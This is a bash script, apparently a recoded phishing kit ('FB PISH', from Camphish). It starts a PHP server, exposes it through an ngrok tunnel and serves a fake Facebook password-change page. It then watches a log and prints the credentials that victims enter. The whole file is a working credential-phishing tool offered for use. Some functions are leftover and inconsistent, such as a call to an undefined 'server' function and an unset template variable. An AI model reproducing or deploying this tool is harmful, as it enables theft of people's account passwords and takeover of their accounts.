trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m    ______ ____ \e[0m\e[1;77m  _____ _____  _____ _    _\e[0m\n"
printf "\e[1;92m   |  ____|  _ \ \e[0m\e[1;77m|  __ \_   _|/ ____| |  | |\e[0m\n"
printf "\e[1;92m   | |__  | |_) |\e[0m\e[1;77m| |__) || | | (___ | |__| |\e[0m\n"
printf "\e[1;92m   |  __| |  _ < \e[0m\e[1;77m|  ___/ | |  \___ \|  __  |\e[0m\n"
printf "\e[1;92m   | |    | |_) |\e[0m\e[1;77m| |    _| |_ ____) | |  | |\e[0m\n"
printf "\e[1;92m   |_|    |____/ \e[0m\e[1;77m|_|   |_____|_____/|_|  |_|\e[0m\n"

printf "\n"
printf " \e[1;77m Recoded from Camphish \e[0m \n"
printf "\n"
printf " \e[1;77m Recoded by R00t Dev1l and Anon|-|@Xo®007 \e[0m \n"

printf "\n"


}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_credentials() {

credentials=$(grep -a 'Credentials:' log.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Credentials:\e[0m\e[1;77m %s\e[0m\n" $credentials

cat log.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "log.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_credentials
rm -rf log.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Credential file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' fbpasschng.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
printf "\e[1;93m [!] Invalid method option! try again\e[0m\n"
fi
rm -rf index3.html

}

select_template() {
if [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a phishing method----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Facebook password change page\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a method=>> \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
printf "\n-----Generating link-----\n"
else
printf "\e[1;93m [!] Invalid method option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Tunnel server is ngrok----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Type 01 to start ngrok server=>> \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 1 ]]; then
ngrok_server

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
fi
rm -rf index3.html

}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
camphish

